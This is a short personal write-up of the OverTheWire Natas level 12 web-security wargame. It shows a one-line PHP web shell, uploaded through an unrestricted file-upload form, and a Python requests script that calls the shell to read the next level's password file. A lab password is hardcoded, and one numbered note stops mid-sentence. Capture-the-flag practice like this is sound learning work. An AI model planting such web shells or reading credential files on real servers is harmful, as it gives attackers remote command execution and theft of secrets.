
2024-07-14 18:54

Source: #youtube #overthewire #natas #web 

Tags:

Natas12

we have a unrestricted file upload functionality 

create a `php` file with the following contents, we will modify the `c` parameter later 
```
<?php
	system($_GET['c']);
?>
```

```
import requests
username = 'natas12'
password = 'yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'

url = 'http://natas12.natas.labs.overthewire.org/'
sessions = requests.Session()

#response = sessions.post(url,files = {"uploadedfile" : open('revshell.php','rb')},data = {"filename": "revshell.php"},auth = (username,password))

response = sessions.get(url + 'upload/kx42yjw6zv.php?c=cat /etc/natas_webpass/natas13',auth = (username,password))

print(response.text)
```
1. commented code tells the 





### References
https://www.youtube.com/watch?v=fqwxYowJA0c